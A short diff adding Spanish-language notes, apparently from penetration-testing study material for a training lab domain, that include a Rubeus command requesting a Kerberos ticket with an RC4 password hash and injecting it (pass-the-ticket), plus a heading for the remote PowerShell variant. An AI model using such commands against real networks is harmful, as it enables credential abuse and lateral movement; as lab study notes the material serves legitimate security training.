@@ -41,6 +41,11 @@ Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068
 
 ######PASS the ticket
 
+Ahora que generamos tickets, podemos pasarlos:
+#Rubeus.exe
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 
+
+########Pass the ticket con powershell remota:
 
 
